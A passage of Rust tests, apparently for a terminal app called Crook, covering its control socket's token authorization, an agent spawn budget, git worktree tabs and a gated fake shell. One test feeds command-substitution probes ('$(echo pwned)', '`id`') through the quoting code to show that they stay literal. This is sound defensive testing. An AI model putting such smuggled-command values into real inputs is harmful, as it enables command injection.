        assert!(heard.is_empty(), "and sent nothing: {heard:?}");
    }

    #[test]
    fn the_peer_of_a_socketpair_is_this_user_and_has_a_pid() {
        let (one, other) = UnixStream::pair().expect("a pair");
        let this = server::Peer {
            uid: server::euid(),
            pid: Some(std::process::id()),
        };
        // The kernel records whoever made each end, and, for macOS's pid,
        // whoever used it last; this process is both, for both ends.
        assert_eq!(
            server::peer_credentials(&one).expect("the kernel says"),
            this
        );
        assert_eq!(
            server::peer_credentials(&other).expect("the kernel says"),
            this
        );
    }

    #[test]
    fn a_script_asks_a_real_window_through_the_socket_and_the_command_line() {
        let root = TempDir::new();
        let (mut window, _) = busy_window();
        let control = Control::open_in(&root.sockets()).expect("opens");
        window
            .workspace
            .update(&mut window.app, |_, ctx| control.serve(ctx));
        let path = control.path().expect("a socket").to_owned();

        // Twice, one after the other, the way a script polling the window
        // would: the window has to be listening again after it answered.
        let asking = thread::spawn(move || {
            let json = cli::unix::listing(&path, None, true, None)?;
            let table = cli::unix::listing(&path, None, false, None)?;
            anyhow::Ok((json, table))
        });
        // The window's side runs here, on the thread that owns it, the way
        // the event loop would run it: between two frames.
        let started = Instant::now();
        while !asking.is_finished() {
            window.queue.run_until_parked();
            assert!(
                started.elapsed() < Duration::from_secs(20),
                "the window never answered"
            );
            thread::yield_now();
        }
        let (json, table) = asking.join().expect("the script").expect("answered");

        let read: Vec<PaneEntry> = serde_json::from_str(&json).expect("a list of panes");
        assert_eq!(read, window.panes());
        assert_eq!(read.len(), 4);
        assert_eq!(
            table,
            cli::table(&read, None),
            "and answered the second time"
        );
    }

    /// A shell for these tests that says nothing until its gate is opened,
    /// then prompts, reads one line, and says it ran it.
    ///
    /// Named `sh`, so the window types into it — `sh` is one of the shells
    /// the quoting is proven in, and one with no marks, whose first prompt is
    /// the first thing it prints. Gated, so that a test can look at a pane
    /// before its first prompt for as long as it likes: a real shell prompts
    /// whenever its startup files let it, and "not sent yet" would be a race.
    struct GatedShell {
        program: PathBuf,
        gate: PathBuf,
    }

    impl GatedShell {
        fn new(root: &TempDir) -> Self {
            let program = root.0.join("sh");
            let gate = root.0.join("gate");
            let script = format!(
                "#!/bin/sh\n\
                 while [ ! -e '{gate}' ]; do sleep 0.1; done\n\
                 printf 'fake$ '\n\
                 IFS= read -r line\n\
                 printf 'ran: %s\\n' \"$line\"\n\
                 exec cat\n",
                gate = gate.display()
            );
            crate::process::write_program(&program, &script);
            Self { program, gate }
        }

        /// A real `bash`, with Crook's integration and so its command marks,
        /// held at a gate the same way: a wrapper named `bash` that prints a
        /// line — output, and no prompt — then waits, then becomes the real
        /// one. In a home of the test's own, so no `~/.bashrc` of whoever runs
        /// the suite prints or prompts first, and no history is written.
        ///
        /// `None` where bash is not installed.
        fn bash(root: &TempDir) -> Option<Self> {
            let real = std::env::split_paths(&std::env::var_os("PATH")?)
                .map(|directory| directory.join("bash"))
                .find(|candidate| candidate.is_file())?;
            let program = root.0.join("bash");
            let gate = root.0.join("gate");
            let home = root.0.join("home");
            fs::create_dir_all(&home).expect("the home is made");
            let script = format!(
                "#!/bin/sh\n\
                 printf 'starting\\n'\n\
                 while [ ! -e '{gate}' ]; do sleep 0.1; done\n\
                 export HOME='{home}' HISTFILE=/dev/null\n\
                 exec '{real}' \"$@\"\n",
                gate = gate.display(),
                home = home.display(),
                real = real.display(),
            );
            crate::process::write_program(&program, &script);
            Some(Self { program, gate })
        }

        /// Lets every shell waiting at the gate go on to its prompt.
        fn open(&self) {
            fs::write(&self.gate, "").expect("the gate opens");
        }
    }

    /// A git repository in `directory` with one commit, or `None` where git
    /// is not installed.
    fn repository(directory: &Path) -> Option<PathBuf> {
        fs::create_dir_all(directory).ok()?;
        let run = |args: &[&str]| {
            crate::process::command("git")
                .args(args)
                .current_dir(directory)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .ok()
                .filter(std::process::ExitStatus::success)
        };
        run(&["init", "--quiet"])?;
        run(&["config", "user.email", "crook@example.invalid"])?;
        run(&["config", "user.name", "crook"])?;
        fs::write(directory.join("README"), "a repository for a worktree\n").ok()?;
        run(&["add", "-A"])?;
        run(&["commit", "--quiet", "-m", "one"])?;
        Some(directory.to_path_buf())
    }

    /// What git says in `directory`.
    fn git(directory: &Path, args: &[&str]) -> String {
        let output = crate::process::command("git")
            .args(args)
            .current_dir(directory)
            .output()
            .expect("git runs");
        String::from_utf8_lossy(&output.stdout).trim().to_owned()
    }

    /// A window serving its socket, with a gated shell in every pane.
    struct Served {
        window: Window,
        control: Control,
        shell: GatedShell,
        /// Kept for its drop, which takes the shell and the sockets with it.
        _root: TempDir,
    }

    impl Served {
        /// `prepare` runs on the workspace before the shells open, which is
        /// when a pane's directory decides where its shell starts.
        fn new(
            prepare: impl FnOnce(&mut Workspace, &mut ViewContext<Workspace>, &TempDir),
        ) -> Self {
            let root = TempDir::new();
            let shell = GatedShell::new(&root);
            Self::with(root, shell, prepare)
        }

        /// The same, with `shell` in every pane.
        fn with(
            root: TempDir,
            shell: GatedShell,
            prepare: impl FnOnce(&mut Workspace, &mut ViewContext<Workspace>, &TempDir),
        ) -> Self {
            let mut window = Window::new();
            let control = Control::open_in(&root.sockets()).expect("opens");
            let socket = control.path().map(Path::to_path_buf);
            window.workspace.update(&mut window.app, |workspace, ctx| {
                prepare(workspace, ctx, &root);
                control.serve(ctx);
                workspace.set_shell(Some(shell.program.clone()), ctx);
                workspace.set_shell_login(false, ctx);
                workspace.set_control_socket(socket, ctx);
                workspace.start_terminals(ctx);
            });
            let mut served = Self {
                window,
                control,
                shell,
                _root: root,
            };
            // The tabs behind the active one open their shells off the
            // thread that draws, after it, and a shell in every pane is this
            // window's promise: the tests ask as a pane in any of its tabs.
            served.pump_until(
                "a pane behind the active tab never got its shell",
                |served| {
                    served.read(|workspace, app| {
                        workspace
                            .tabs()
                            .panes()
                            .all(|(_, pane)| workspace.terminal(pane.id(), app).is_some())
                    })
                },
            );
            served
        }

        fn socket(&self) -> PathBuf {
            self.control.path().expect("a socket").to_owned()
        }

        /// Runs the window's side until `done`, the way the event loop would.
        fn pump_until(&mut self, what: &str, mut done: impl FnMut(&Self) -> bool) {
            let started = Instant::now();
            while !done(self) {
                self.window.queue.run_until_parked();
                assert!(started.elapsed() < Duration::from_secs(30), "{what}");
                thread::sleep(Duration::from_millis(10));
            }
        }

        /// Asks from a thread of its own, the way a program in a pane would,
        /// while the window answers on this one.
        fn ask<T: Send + 'static>(
            &mut self,
            asking: impl FnOnce(PathBuf) -> T + Send + 'static,
        ) -> T {
            let socket = self.socket();
            let asking = thread::spawn(move || asking(socket));
            self.pump_until("the window never answered", |_| asking.is_finished());
            asking.join().expect("the asking thread")
        }

        /// Asks for `asked` as the pane holding `token`, and hands back what
        /// the command line would print, or say.
        fn open_tab(&mut self, token: Option<String>, asked: NewTab) -> Result<Opened, String> {
            self.ask(move |socket| {
                cli::unix::open_tab(&socket, token.as_deref(), asked, true)
                    .map(|printed| serde_json::from_str(&printed.text).expect("the answer is JSON"))
                    .map_err(|error| error.to_string())
            })
        }

        fn read<T>(&self, read: impl FnOnce(&Workspace, &AppContext) -> T) -> T {
            self.window.workspace.read(&self.window.app, read)
        }

        /// The token the window handed a pane's shell.
        fn token(&self, pane: PaneId) -> String {
            self.read(|workspace, app| workspace.token_of(pane, app))
                .expect("a pane of a window with a socket is handed a token")
        }

        fn pane(&self, number: u64) -> PaneId {
            self.read(|workspace, _| {
                workspace
                    .tabs()
                    .panes()
                    .map(|(_, pane)| pane.id())
                    .find(|pane| pane.as_u64() == number)
            })
            .unwrap_or_else(|| panic!("no pane {number} in the window"))
        }

        fn field(&self, pane: PaneId) -> String {
            self.read(|workspace, _| {
                workspace
                    .input(pane)
                    .map(|input| input.editor().text().to_owned())
                    .unwrap_or_default()
            })
        }

        fn text(&self, pane: PaneId) -> String {
            self.read(|workspace, app| workspace.terminal_text(pane, app))
                .unwrap_or_default()
        }

        /// What the newest command a pane's shell marked the end of printed:
        /// read off the finished block, since a command's output leaves the
        /// grid when the next prompt is drawn.
        fn output(&self, pane: PaneId) -> Option<String> {
            self.read(|workspace, app| workspace.newest_block_output(pane, app))
        }

        fn session<T>(&self, pane: PaneId, read: impl FnOnce(&crate::tab::AgentSession) -> T) -> T {
            self.read(|workspace, _| {
                read(
                    workspace
                        .tabs()
                        .pane(pane)
                        .expect("the pane is open")
                        .session(),
                )
            })
        }

        /// The tab holding `pane`.
        fn tab_of(&self, pane: PaneId) -> crate::tab::TabId {
            self.read(|workspace, _| {
                workspace
                    .tabs()
                    .panes()
                    .find(|(_, open)| open.id() == pane)
                    .map(|(tab, _)| tab)
                    .expect("the pane is open")
            })
        }

        fn tab_count(&self) -> usize {
            self.read(|workspace, _| workspace.tabs().len())
        }

        /// Starts asking from a thread of its own and hands the thread back,
        /// for a question the window answers only once the test has made
        /// something happen: see [`Self::finish`].
        fn start<T: Send + 'static>(
            &self,
            asking: impl FnOnce(PathBuf) -> T + Send + 'static,
        ) -> thread::JoinHandle<T> {
            let socket = self.socket();
            thread::spawn(move || asking(socket))
        }

        /// Runs the window's side until a question [`Self::start`]ed has its
        /// answer, and hands the answer back.
        fn finish<T>(&mut self, asking: thread::JoinHandle<T>) -> T {
            self.pump_until("the window never answered", |_| asking.is_finished());
            asking.join().expect("the asking thread")
        }

        fn update<T>(
            &mut self,
            update: impl FnOnce(&mut Workspace, &mut ViewContext<Workspace>) -> T,
        ) -> T {
            self.window.workspace.update(&mut self.window.app, update)
        }

        /// What a pane's agent says, through the call the terminal model's
        /// subscription makes when an agent reports over its OSC.
        fn report(&mut self, pane: PaneId, status: AgentStatus, message: Option<&str>) {
            let update = TerminalUpdate::Agent {
                pane,
                status,
                title: None,
                message: message.map(str::to_owned),
            };
            self.update(|workspace, ctx| workspace.apply_terminal_update(&update, ctx));
        }

        /// What a pane's program set its terminal title to, through the call
        /// the terminal model's subscription makes: how Claude Code with no
        /// hooks says what it is doing.
        fn titled(&mut self, pane: PaneId, title: &str) {
            let update = TerminalUpdate::Title(pane, Some(title.to_owned()));
            self.update(|workspace, ctx| workspace.apply_terminal_update(&update, ctx));
        }

        /// How many waits the window holds that have not got there.
        fn waiting(&self) -> usize {
            self.read(|workspace, _| workspace.watches().waiting())
        }

        /// How many streams of events the window is feeding.
        fn following(&self) -> usize {
            self.read(|workspace, _| workspace.watches().following())
        }

        /// Whether a pane's shell is sitting at a prompt it marked.
        fn at_prompt(&self, pane: PaneId) -> bool {
            self.read(|workspace, app| {
                workspace.terminal(pane, app).is_some_and(|(_, snapshot)| {
                    snapshot.live_block.state == crook_terminal::BlockState::AtPrompt
                })
            })
        }

        /// Types `line` into a marked shell at its prompt, round the field,
        /// and waits for the block it makes to close.
        fn run(&mut self, pane: PaneId, line: &str) {
            self.pump_until("the shell never came to a prompt", |served| {
                served.at_prompt(pane)
            });
            let typed = format!("{line}\r");
            self.update(|workspace, ctx| workspace.type_into(pane, &typed, ctx));
            self.pump_until("the command never became a block", |served| {
                served.read(|workspace, app| {
                    workspace.terminal_blocks(pane, app).is_some_and(|history| {
                        history
                            .iter()
                            .any(|block| block.command.as_deref() == Some(line))
                    })
                })
            });
        }
    }

    use super::super::protocol::{BlocksRead, Follow, PaneEvent, ReadBlocks, Until, Wait, Waited};
    use super::super::watch::{self, Feed};
    use crate::tab::{Lineage, PaneId, StatusSource};
    use crate::terminal_model::TerminalUpdate;

    /// `crook pane wait`, as the command line asks it from inside a pane.
    fn wait(
        token: &str,
        pane: PaneId,
        until: Until,
        timeout: u64,
        json: bool,
    ) -> impl FnOnce(PathBuf) -> Result<cli::Printed, String> + Send + 'static {
        let token = token.to_owned();
        let asked = Wait {
            pane: pane.as_u64(),
            until,
            timeout: Some(timeout),
        };
        move |socket| {
            cli::unix::wait(&socket, Some(&token), asked, json).map_err(|error| error.to_string())
        }
    }

    /// `crook pane blocks --json`, read back.
    fn read_blocks(
        token: &str,
        pane: PaneId,
        last: Option<usize>,
    ) -> impl FnOnce(PathBuf) -> Result<BlocksRead, String> + Send + 'static {
        let token = token.to_owned();
        let asked = ReadBlocks {
            pane: pane.as_u64(),
            last,
        };
        move |socket| {
            cli::unix::read_blocks(&socket, Some(&token), asked, true, None)
                .map(|json| serde_json::from_str(&json).expect("the answer is blocks"))
                .map_err(|error| error.to_string())
        }
    }

    /// `crook events --follow`, until the window ends it: what it said, as
    /// events, or the refusal.
    fn follow(
        token: Option<&str>,
        pane: Option<PaneId>,
    ) -> impl FnOnce(PathBuf) -> Result<Vec<PaneEvent>, String> + Send + 'static {
        let token = token.map(str::to_owned);
        let asked = Follow {
            pane: pane.map(PaneId::as_u64),
        };
        move |socket| {
            let mut out = Vec::new();
            cli::unix::follow(&socket, token.as_deref(), asked, &mut out)
                .map_err(|error| error.to_string())?;
            let out = String::from_utf8(out).expect("the output is text");
            Ok(out
                .lines()
                .map(|line| serde_json::from_str(line).expect("each line is an event"))
                .collect())
        }
    }

    /// The one pane a new window opens with.
    fn first_pane(served: &Served) -> PaneId {
        served.read(|workspace, _| workspace.tabs().focused_pane_id().expect("a pane"))
    }

    #[test]
    fn with_no_token_a_script_may_list_the_panes_and_may_not_open_a_tab() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let token = served.token(pane);
        let tabs = served.tab_count();

        // Read-only, with no token at all, as it always was: what a script
        // outside every pane is allowed.
        let listed = served.ask(|socket| cli::unix::listing(&socket, None, true, None));
        let listed: Vec<PaneEntry> =
            serde_json::from_str(&listed.expect("listed")).expect("a list of panes");
        assert_eq!(listed.len(), 1);

        for (who, sent) in [
            ("no token", None),
            ("a token no pane holds", Some("0".repeat(token.len()))),
            ("an empty token", Some(String::new())),
        ] {
            let refused = served
                .open_tab(sent, new_tab(&["make"]))
                .expect_err("only a pane may open a tab");
            assert!(refused.contains("unauthorized"), "{who}: {refused}");
            assert!(
                refused.contains("CROOK_TOKEN"),
                "{who}: the refusal says what is missing: {refused}"
            );
        }
        assert_eq!(served.tab_count(), tabs, "nothing was opened");

        // And the pane's own token is what makes the difference.
        served
            .open_tab(Some(token), new_tab(&["make"]))
            .expect("the pane may");
        assert_eq!(served.tab_count(), tabs + 1);
    }

    #[test]
    fn a_pane_opens_a_tab_in_its_group_without_focus_and_its_command_runs_at_the_first_prompt() {
        let mut served = Served::new(|workspace, ctx, _| {
            // A second tab, and the one a person is looking at: the new tab
            // goes beside the pane that asked, not beside the person.
            workspace.apply(TabAction::New, ctx);
        });
        let (caller, looking_at) = served.read(|workspace, _| {
            let strip = workspace.tabs();
            let first = strip.iter().next().expect("a tab").panes().focused_id();
            (first, strip.focused_pane_id().expect("a pane"))
        });
        let caller_tab = served.tab_of(caller);
        let active = served.read(|workspace, _| workspace.tabs().active_id());
        served.read(|workspace, _| {
            assert_eq!(workspace.tabs().get(caller_tab).and_then(Tab::group), None)
        });
        let token = served.token(caller);

        let opened = served
            .open_tab(
                Some(token),
                NewTab {
                    command: vec!["claude".to_owned(), "fix the \"flaky\" test".to_owned()],
                    in_my_group: true,
                    title: Some("fix the flaky test".to_owned()),
                    ..NewTab::default()
                },
            )
            .expect("the pane may open a tab");
        let worker = served.pane(opened.pane_id);

        // In this window, in the caller's group, and nobody's keyboard moved.
        let worker_tab = served.tab_of(worker);
        assert_eq!(worker_tab.as_u64(), opened.tab_id);
        served.read(|workspace, _| {
            let strip = workspace.tabs();
            let group = strip.get(caller_tab).and_then(Tab::group);
            assert!(group.is_some(), "the caller's tab was made a group with it");
            assert_eq!(strip.get(worker_tab).and_then(Tab::group), group);
            assert_eq!(strip.active_id(), active, "the tab took the person's focus");
            assert_eq!(strip.focused_pane_id(), Some(looking_at));
        });
        assert_eq!(
            served.session(worker, |session| session.display_title().to_owned()),
            "fix the flaky test"
        );
        let caller_title = served.read(|workspace, _| {
            super::super::title(
                workspace.tabs().pane(caller).expect("open").session(),
                workspace.home(),
            )
        });
        assert_eq!(
            served.session(worker, |session| session.spawned_by.clone()),
            Some(Lineage {
                caller,
                root: caller,
                title: caller_title,
            })
        );

        // Typed into its field, and not sent: its shell has not prompted.
        let line = r#"'claude' 'fix the "flaky" test'"#;
        assert_eq!(served.field(worker), line);
        served.window.queue.run_until_parked();
        assert!(
            !served.text(worker).contains("ran:"),
            "{}",
            served.text(worker)
        );
        assert_eq!(served.field(worker), line, "sent before the shell prompted");

        // The prompt, and the line goes, the way Enter sends one.
        served.shell.open();
        served.pump_until("the command never ran", |served| {
            served.text(worker).contains("ran: ")
        });
        assert!(
            served.text(worker).contains(&format!("ran: {line}")),
            "the shell was sent the line as it was typed: {}",
            served.text(worker)
        );
        assert_eq!(served.field(worker), "", "the field was sent, not copied");
    }

    #[test]
    fn a_worktree_is_made_from_the_callers_head_and_the_tab_opens_in_it() {
        let mut checkout_store = None;
        let mut made = None;
        let mut served = Served::new(|workspace, ctx, root| {
            let Some(repository) = repository(&root.0.join("repo")) else {
                return;
            };
            // A repository that keeps its `.env` out of git and names it in
            // `.worktreeinclude`, as Claude Code recommends. `local.toml` is
            // named too, and ignored only by an edit to the main checkout's
            // `.gitignore` nobody has committed: a new checkout does not
            // ignore it, so it is left out, and the answer says so.
            fs::write(repository.join(".gitignore"), ".env\n").expect("written");
            fs::write(repository.join(".worktreeinclude"), ".env\nlocal.toml\n").expect("written");
            git(&repository, &["add", ".gitignore", ".worktreeinclude"]);
            git(&repository, &["commit", "--quiet", "-m", "ignore .env"]);
            fs::write(repository.join(".gitignore"), ".env\nlocal.toml\n").expect("written");
            fs::write(repository.join(".env"), "SECRET=main\n").expect("written");
            fs::write(repository.join("local.toml"), "mine = true\n").expect("written");
            // The caller works in a checkout of its own, a commit ahead of
            // the main one: its HEAD is the base, and the main checkout's is
            // not.
            let feature = root.0.join("feature");
            git(
                &repository,
                &[
                    "worktree",
                    "add",
                    "--quiet",
                    "-b",
                    "feature",
                    &feature.display().to_string(),
                ],
            );
            fs::write(feature.join("NOTES"), "a commit ahead\n").expect("written");
            git(&feature, &["add", "NOTES"]);
            git(&feature, &["commit", "--quiet", "-m", "two"]);

            let store = root.0.join("store");
            workspace.set_worktrees_directory(store.clone());
            let pane = workspace.tabs().focused_pane_id().expect("a pane");
            workspace.update_session(pane, ctx, |session| {
                session.working_directory = Some(feature.clone());
            });
            checkout_store = Some(store);
            made = Some((repository, feature));
        });
        let (Some(store), Some((repository, feature))) = (checkout_store, made) else {
            eprintln!("skipped: no git here to make a repository with");
            return;
        };
        assert_ne!(
            git(&feature, &["rev-parse", "HEAD"]),
            git(&repository, &["rev-parse", "HEAD"]),
            "the caller's checkout is not where the main one is"
        );
        let caller = first_pane(&served);
        let token = served.token(caller);

        let opened = served
            .open_tab(
                Some(token.clone()),
                NewTab {
                    command: vec!["make".to_owned()],
                    worktree: Some("fix-x".to_owned()),
                    in_my_group: true,
                    ..NewTab::default()
                },
            )
            .expect("git made the worktree");
        let checkout = crate::git::worktree::checkout_path(&store, "repo", "fix-x");
        assert_eq!(opened.cwd, Some(checkout.display().to_string()));
        assert!(checkout.join("NOTES").is_file(), "nothing was checked out");
        assert_eq!(git(&checkout, &["branch", "--show-current"]), "fix-x");
        assert_eq!(
            git(&checkout, &["rev-parse", "HEAD"]),
            git(&feature, &["rev-parse", "HEAD"]),
            "the branch starts at the caller's HEAD"
        );

        // The checkout the menu's creator makes, and not only its branch:
        // given what the main checkout's `.worktreeinclude` names before the
        // tab's shell starts, and locked while the window works in it.
        assert_eq!(
            fs::read_to_string(checkout.join(".env")).ok().as_deref(),
            Some("SECRET=main\n"),
            "the .env .worktreeinclude names was not copied in"
        );
        assert!(
            !checkout.join("local.toml").exists(),
            "a file the new checkout does not ignore was copied in"
        );
        let note = opened.note.clone().unwrap_or_default();
        assert!(
            note.contains("local.toml"),
            "the answer does not say what did not arrive: {note:?}"
        );
        let lock = || {
            crate::git::worktree::list(&repository)
                .expect("the repository lists")
                .into_iter()
                .find(|listed| listed.branch.as_deref() == Some("fix-x"))
                .and_then(|listed| listed.locked)
        };
        assert_eq!(
            lock(),
            Some(crate::git::worktree::lock_reason("fix-x")),
            "the checkout was opened without being locked"
        );

        let worker = served.pane(opened.pane_id);
        assert_eq!(
            served.session(worker, |session| session.working_directory.clone()),
            Some(checkout.clone()),
            "the tab's shell starts in the checkout"
        );
        served.read(|workspace, _| {
            let strip = workspace.tabs();
            let group = strip
                .get(served.tab_of(worker))
                .and_then(Tab::group)
                .and_then(|group| strip.group(group))
                .map(|group| group.name().to_owned());
            assert_eq!(
                group.as_deref(),
                Some("repo"),
                "the group is the repository's"
            );
        });

        // A name git will not make a branch of is git's to refuse, as it is
        // in the menu's creator, and a blank one is refused before git.
        let tabs = served.tab_count();
        for (branch, said) in [
            ("bad..name", "not a valid branch name"),
            ("  ", "needs a branch name"),
        ] {
            let refused = served
                .open_tab(
                    Some(token.clone()),
                    NewTab {
                        command: vec!["make".to_owned()],
                        worktree: Some(branch.to_owned()),
                        ..NewTab::default()
                    },
                )
                .expect_err("refused");
            assert!(refused.contains(said), "{branch:?}: {refused}");
        }
        assert_eq!(served.tab_count(), tabs, "a refused worktree opened a tab");

        // Held from the moment the tab opened rather than left in the stage
        // of a creation still waiting for one: the worker's closing is the
        // last pane in the checkout leaving, and the lock goes with it.
        assert!(
            lock().is_some(),
            "the lock went with the worker still in it"
        );
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(worker), ctx);
        });
        // The window's word first, and git's once that is in: `lock` lists
        // the worktrees, and a listing that runs while the unlock does can die
        // on the lock file it is deleting. The window lets go of a lock only
        // once the unlock has answered.
        served.pump_until("the window never let go of the lock", |served| {
            served.read(|workspace, _| workspace.held_locks().is_empty())
        });
        assert_eq!(lock(), None, "the lock did not go with the worker");
        assert!(
            checkout.is_dir(),
            "closing the worker took the checkout too"
        );
    }

    #[test]
    fn a_worktree_tabs_connection_outwaits_every_deadline_its_checkout_is_made_under() {
        let root = TempDir::new();
        let Some(repository) = repository(&root.0.join("repo")) else {
            eprintln!("skipped: no git here to make a repository with");
            return;
        };
        // A `.env` for `.worktreeinclude` to name, so that the copy asks git
        // everything it asks before a file goes: where the main checkout is,
        // what it ignores, what the patterns match there, and what the new
        // checkout ignores.
        fs::write(repository.join(".gitignore"), ".env\n").expect("written");
        fs::write(repository.join(".worktreeinclude"), ".env\n").expect("written");
        git(&repository, &["add", ".gitignore", ".worktreeinclude"]);
        git(&repository, &["commit", "--quiet", "-m", "ignore .env"]);
        fs::write(repository.join(".env"), "SECRET=main\n").expect("written");
        let checkout = root.0.join("fix-x");

        // What the window does between being asked for the tab and answering,
        // here on the test's thread, where every deadline its git runs under
        // is counted: the listing that names the repository, then the
        // checkout the menu's creator makes.
        let held = crate::workspace::HeldLocks::default();
        let before = crate::git::worktree::deadlines_run_under();
        crate::git::worktree::list(&repository).expect("the repository lists");
        let included = held
            .make_checkout(&repository, &checkout, "fix-x", None)
            .expect("git made the worktree");
        let ran_under = crate::git::worktree::deadlines_run_under() - before;
        let locked = !held.checkouts().is_empty();
        held.release_all(Duration::from_secs(10));
        assert!(locked, "the checkout was not locked");
        assert_eq!(
            (included.copied, included.problem()),
            (1, None),
            "the copy stopped short of the .env"
        );

        // A connection that gave up any sooner could print `timeout` about a
        // tab that then opened.
        let patience = Verb::TabNew(NewTab {
            command: vec!["make".to_owned()],
            worktree: Some("fix-x".to_owned()),
            ..NewTab::default()
        })
        .patience()
        .expect("a tab in a new worktree is given time");
        assert!(
            patience > ran_under,
            "the connection gives up after {}s on a checkout git may take {}s to make",
            patience.as_secs(),
            ran_under.as_secs()
        );
    }

    #[test]
    fn the_budget_refuses_the_tab_past_it_and_a_worker_spends_its_roots() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);

        let mut workers = Vec::new();
        for _ in 0..spawn::SPAWN_BUDGET {
            let opened = served
                .open_tab(Some(token.clone()), new_tab(&["make"]))
                .expect("within the budget");
            workers.push(served.pane(opened.pane_id));
        }
        let refused = served
            .open_tab(Some(token.clone()), new_tab(&["make"]))
            .expect_err("past the budget");
        assert!(refused.contains("budget"), "{refused}");
        assert_eq!(served.tab_count(), spawn::SPAWN_BUDGET + 1);

        // A worker asking for workers of its own spends the lead's: eight
        // each, and each of those eight more, is how a loop fills a window.
        let worker = workers[0];
        let worker_token = served.token(worker);
        let refused = served
            .open_tab(Some(worker_token.clone()), new_tab(&["make"]))
            .expect_err("the lead's budget is spent");
        assert!(refused.contains("budget"), "{refused}");

        // A tab that closes gives its place back.
        served
            .window
            .workspace
            .update(&mut served.window.app, |workspace, ctx| {
                workspace.apply(TabAction::ClosePane(workers[1]), ctx);
            });
        let opened = served
            .open_tab(Some(worker_token), new_tab(&["make"]))
            .expect("a place came free");
        assert_eq!(
            served.session(served.pane(opened.pane_id), |session| session
                .spawned_by
                .clone()),
            Some(Lineage {
                caller: worker,
                root: lead,
                title: served.read(|workspace, _| {
                    super::super::title(
                        workspace.tabs().pane(worker).expect("open").session(),
                        workspace.home(),
                    )
                }),
            }),
            "opened by the worker, and counted against the lead"
        );
    }

    #[test]
    fn a_shell_with_marks_is_sent_the_line_at_its_first_prompt_and_not_at_its_first_output() {
        // The other half of `TerminalUpdate::Prompted`, and the one every
        // pane of sh, bash, zsh and fish with the integration on goes
        // through: the shell's first `A`, not the first thing it prints. The
        // wrapper prints before bash has started, so a pane that sent at the
        // first output would send here, to a shell that is not at a prompt.
        let root = TempDir::new();
        let Some(shell) = GatedShell::bash(&root) else {
            eprintln!("skipped: no bash here");
            return;
        };
        let mut served = Served::with(root, shell, |_, _, _| {});
        let marked = served.read(|workspace, app| {
            matches!(
                workspace.shell_standing(app).0.marks,
                crate::shell_integration::Marks::Installed(_)
            )
        });
        if !marked {
            eprintln!("skipped: the shell integration is opted out of here");
            return;
        }
        let caller = first_pane(&served);
        let token = served.token(caller);

        // One line out, with a newline only at its end: the format is a word
        // of its own, so the pty's echo of the line carries `%s` where the
        // output carries the words.
        let words = [
            "printf",
            "%s|%s|%s|%s|%s|%s\\n",
            "it's",
            "\"double\"",
            "$(echo pwned)",
            "`id`",
            "$HOME",
            "END",
        ];
        let opened = served
            .open_tab(Some(token), new_tab(&words))
            .expect("the pane may open a tab");
        let worker = served.pane(opened.pane_id);
        let owned: Vec<String> = words.iter().map(|word| (*word).to_owned()).collect();
        let line = spawn::command_line(&owned, Path::new("bash")).expect("a proven shell");
        assert_eq!(served.field(worker), line);

        // Output, and no prompt yet: the line waits.
        served.pump_until("the wrapper never spoke", |served| {
            served.text(worker).contains("starting")
        });
        served.window.queue.run_until_parked();
        assert_eq!(
            served.field(worker),
            line,
            "sent at the first output, before the shell prompted"
        );

        // The first prompt, and the line goes and runs as a command of its
        // own: one the shell marked the end of, printing the words as given.
        served.shell.open();
        served.pump_until("the command never ran", |served| {
            served
                .output(worker)
                .is_some_and(|output| output.contains("END"))
        });
        let output = served.output(worker).unwrap_or_default();
        assert!(
            output
                .lines()
                .any(|printed| printed == "it's|\"double\"|$(echo pwned)|`id`|$HOME|END"),
            "the words did not arrive as themselves: {output:?}"
        );
        assert_eq!(served.field(worker), "", "the field was sent, not copied");
    }

    #[test]
    fn a_worktree_git_will_not_make_is_a_refusal_that_counts_toward_the_stop() {
        // Agreed to, then refused by git on the pool: the refusal is counted
        // after the request was, and it must not be the agreeing that starts
        // the count again, or an agent asking for a branch git will never
        // make would be answered — and send git to work — for ever.
        let mut made = false;
        let mut served = Served::new(|workspace, ctx, root| {
            let Some(repository) = repository(&root.0.join("repo")) else {
                return;
            };
            workspace.set_worktrees_directory(root.0.join("store"));
            let pane = workspace.tabs().focused_pane_id().expect("a pane");
            workspace.update_session(pane, ctx, |session| {
                session.working_directory = Some(repository);
            });
            made = true;
        });
        if !made {
            eprintln!("skipped: no git here to make a repository with");
            return;
        }
        let token = served.token(first_pane(&served));
        let bad = || NewTab {
            command: vec!["make".to_owned()],
            worktree: Some("bad..name".to_owned()),
            ..NewTab::default()
        };

        let refuse = |served: &mut Served, times: u32| {
            for _ in 0..times {
                let refused = served
                    .open_tab(Some(token.clone()), bad())
                    .expect_err("git refuses the name");
                assert!(refused.contains("failed"), "{refused}");
            }
        };
        // One short, and then a tab that opens: that, and only that, starts
        // the count again.
        refuse(&mut served, spawn::REFUSALS_ALLOWED - 1);
        served
            .open_tab(Some(token.clone()), new_tab(&["make"]))
            .expect("one short of the stop, a tab still opens");
        refuse(&mut served, spawn::REFUSALS_ALLOWED);
        let stopped = served
            .open_tab(Some(token.clone()), bad())
            .expect_err("the window has stopped answering");
        assert!(stopped.contains("too-many-refusals"), "{stopped}");
        let stopped = served
            .open_tab(Some(token), new_tab(&["make"]))
            .expect_err("and not only for worktrees");
        assert!(stopped.contains("too-many-refusals"), "{stopped}");
    }

    #[test]
    fn a_tab_agreed_to_before_the_stop_that_opens_after_it_leaves_the_pane_stopped() {
        // A worktree is agreed to, and while git makes it the same pane is
        // refused sixteen times. The tab that opens afterwards is one the
        // window said yes to before the stop, not a sign the pane is back in
        // the ordinary state; letting it start the count again would hand a
        // loop another sixteen for every slow checkout it had in flight.
        let mut gated = None;
        let mut served = Served::new(|workspace, ctx, root| {
            let Some(repository) = repository(&root.0.join("repo")) else {
                return;
            };
            // A checkout that says when git has got to it — by then the
            // request has been agreed to — and holds git there until the test
            // lets it go. Bounded, so a test that fails first leaves nothing
            // running for long.
            let hooks = root.0.join("hooks");
            let reached = root.0.join("checking-out");
            let gate = root.0.join("checked-out");
            fs::create_dir_all(&hooks).expect("the hooks directory is made");
            let hook = hooks.join("post-checkout");
            let script = format!(
                "#!/bin/sh\n\
                 : > '{reached}'\n\
                 i=0\n\
